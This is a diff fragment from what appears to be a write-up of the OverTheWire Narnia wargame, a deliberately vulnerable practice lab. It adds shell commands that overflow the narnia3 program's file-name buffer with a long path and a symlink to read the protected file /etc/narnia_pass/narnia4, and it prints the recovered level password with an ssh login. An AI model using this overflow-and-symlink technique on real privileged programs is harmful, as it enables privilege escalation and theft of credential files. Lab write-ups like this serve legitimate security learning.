@@ -148,3 +148,18 @@
  
             exit(1);
         }
+
+
+        # mkdir -p /tmp/pass/narnia3---------------/tmp
+        # ln -s /etc/narnia_pass/narnia4 /tmp/pass/narnia3---------------/tmp/n4ps
+        # touch /tmp/n4ps
+        # /games/narnia/narnia3 /tmp/pass/narnia3---------------/tmp/n4ps
+        copied contents of /tmp/pass/narnia3---------------/tmp/n4ps to a safer place... (/tmp/n4ps)
+
+        # cat /tmp/n4ps
+        thaenohtai
+
+### level 4
+
+        # ssh narnia3@narnia.labs.overthewire.org
+        password: thaenohtai
